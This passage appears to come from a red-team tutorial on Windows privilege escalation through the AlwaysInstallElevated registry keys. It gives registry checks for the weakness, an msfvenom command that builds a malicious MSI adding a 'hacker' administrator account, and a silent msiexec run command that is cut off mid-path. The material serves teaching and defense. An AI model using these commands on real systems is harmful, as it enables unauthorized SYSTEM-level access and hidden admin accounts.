caught.\r\n\r\n### **3.4 Case Study: AlwaysInstallElevated**\r\n\r\nLet's look at a classic, simple PE vector: the `AlwaysInstallElevated` registry key.\r\n\r\n*   **The Vulnerability:** Windows Installer (msiexec) can be configured via Group Policy or registry keys to install `.msi` packages with elevated privileges (SYSTEM) even if the user running the installer is not an administrator. This feature is intended for specific deployment scenarios but is a major security risk if enabled globally.\r\n*   **Identification:** Check these two registry keys:\r\n    *   `HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated`\r\n    *   `HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated`\r\n    *   If *both* keys exist and are set to `1`, the vulnerability is present.\r\n    ```powershell\r\n    # Check HKCU\r\n    Get-ItemProperty -Path \"HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\" -Name \"AlwaysInstallElevated\" -ErrorAction SilentlyContinue\r\n\r\n    # Check HKLM\r\n    Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\" -Name \"AlwaysInstallElevated\" -ErrorAction SilentlyContinue\r\n    ```\r\n    ```cmd\r\n    reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\r\n    reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\r\n    ```\r\n*   **Exploitation:**\r\n    1.  If both keys are `1`, you can create a malicious `.msi` package.\r\n    2.  Execute the `.msi` package using `msiexec`.\r\n    3.  Your code within the `.msi` package will execute with SYSTEM privileges.\r\n    *   **Creating a Malicious MSI:** This requires specific tools (like `msfvenom` or creating a custom WiX project). `msfvenom` is the simpler route for red teaming.\r\n        ```bash\r\n        # Example using msfvenom to create an MSI that adds a user 'hacker' with password 'Password123!'\r\n        msfvenom -p windows/exec CMD='net user hacker Password123! /add && net localgroup administrators hacker /add' -f msi -o evil.msi\r\n        ```\r\n    *   **Executing the MSI:**\r\n        ```cmd\r\n        msiexec /quiet /qn /i C:\\Path\\To\\"
